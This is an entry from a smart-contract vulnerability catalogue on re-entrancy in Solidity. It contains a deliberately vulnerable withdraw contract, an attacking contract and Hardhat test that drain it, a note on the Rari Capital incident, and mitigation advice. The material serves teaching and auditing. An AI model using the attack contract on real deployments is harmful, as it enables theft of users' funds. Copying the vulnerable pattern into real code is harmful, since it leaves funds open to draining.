[back](../../README.md)
# Re-Entrancy Attack

**name:** Re-Entrancy Attack

**Severity:** Critical

**Description:** 

Consider an application scenario on Ethereum, in which smart contract A sends ETHs to smart contract B and smart contract B has a callback function which calls an interface of smart contract A. When smart contract A sends ETHs to smart contract B, smart contract B will receive the ETHs and "re-enter" smart contract A by calling the callback function which calls an interface of smart contrat A. In this case if there is an implementation vulnerability or an unexpected state transition, unexpected issues or risks will occur. When an re-entrancy risk happens, all the external interfaces of the target smart contract might be “re-entered”. A re-entrancy risk happens quite often when one smart contract sends another smart contract ETHs or tokens (such as those based on ERC-721, ERC-1155 or ERC-677 etc) which have a callback function. For Ethereum dApps, re-entrancy risks always need heightened awareness. 



**Language:** Solidity

**Code Sample:**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract ReEntrancyDemo {
    mapping(address => uint) public user_amounts;

    function deposit() external payable {
        user_amounts[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint value = user_amounts[msg.sender];
        require(value > 0, "zero value");
        (bool success,) = msg.sender.call{value : value}("");
        require(success, "E05");
        user_amounts[msg.sender] = 0;
    }
}

contract AttackDemo {
    bool once = false;
    function deposit(address target) external payable {
        require(msg.value == 1 ether, "E01");
        ReEntrancyDemo(target).deposit{value : msg.value}();
    }

    function withdraw(address target) external {
        uint balance_before = address(this).balance;
        assert(balance_before == 0);
        ReEntrancyDemo(target).withdraw();
        uint balance_after = address(this).balance;
        assert(balance_after == 2 ether);
    }
		
    receive() external payable {
        if(!once) {
            once = true;
            // Re-entrancy Attack
            ReEntrancyDemo(msg.sender).withdraw();
        }
    }
}
```




**Description of Code Sample:**

In the above code, when a user calls the withdraw function, the target contract will send the attacking contract ETHs and the attacking contract's callback function "receive" will be called. The receive function subsequently calls the target contract's withdraw function again (it re-enters now!). However the target contract's "user_amounts[msg.sender]" hasn't been updated to 0, therefore the validation can still succeed. After the second withdrawal takes place, the value becomes 0 and no further withdrawals can succeed.   



The "once" variable defines whether "re-entrancy" happens. This is to avoid out-of-gas or transaction failues due to insufficient balances.



**Unit Test Code:**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ReEntrancyDemo Test", function () {
    let target;
    let instance;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let ReEntrancyDemo = await ethers.getContractFactory("ReEntrancyDemo");
        target = await ReEntrancyDemo.deploy();
        let AttackDemo = await ethers.getContractFactory("AttackDemo");
        instance = await AttackDemo.deploy();
        [owner,user1,user2,...users] = await ethers.getSigners();
    })
    
    describe('attack test', () => { 
        let value = ethers.utils.parseEther("1.0")
        it("attack test", async () => {
            await target.connect(user1).deposit({value});
            await instance.deposit(target.address,{value});
            expect(await ethers.provider.getBalance(target.address)).to.be.equal(value.mul(2));
            await instance.withdraw(target.address);
            expect(await ethers.provider.getBalance(target.address)).to.be.equal(0);
        });
    })
});
```

**Real Case:**

Here is an attack that targeted Rari Capital, a Compound alike DeFi application deployed on Ethereum. In the attack, crypto assets valued at around $79.21 million were exploited. The attacker exploited the vulnerability that existed in "cEther.sol" to launch a re-entrancy attack. Quite a few other Compound alike DeFi applications such as Agave on Gnosis sufferred from this attack as well. Re-entrancy attacks always need heightened awareness.



**Recommendations:**

1. Consider following a Solidity programming's common rule: make sure all state changes happen before calling external contracts. 

2. When necessary, add a re-entrant lock for every external interface.

3. Use "transfer" instead of "call" to send ETHs.

4. When interacting with a token based on ERC-721, ERC-1155 or ERC-677, always handle the interaction with great care by assuming it might have a malicious callback function.

5. Please consult with professional audit companies to conduct an audit.

